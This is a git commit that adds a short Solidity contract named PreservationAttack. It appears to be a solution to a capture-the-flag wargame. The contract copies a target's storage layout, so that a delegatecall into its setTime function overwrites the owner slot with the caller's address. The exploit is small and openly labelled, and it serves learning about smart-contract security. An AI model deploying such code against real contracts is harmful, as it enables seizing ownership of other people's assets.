0d2dba54b75925d7be2f69659a308829346a9a3d
Marc Nyiti <nyiti604@gmail.com>
2021-05-25 18:53:16 -0700

    Create PreservationAttack.sol

---
+++ PreservationAttack.sol
@@ -0,0 +1,14 @@
+pragma solidity ^0.6.0;
+
+contract PreservationAttack {
+    
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner; 
+    uint storedTime;
+    
+    function setTime(uint _time) public {
+        owner = msg.sender;
+    }
+    
+}
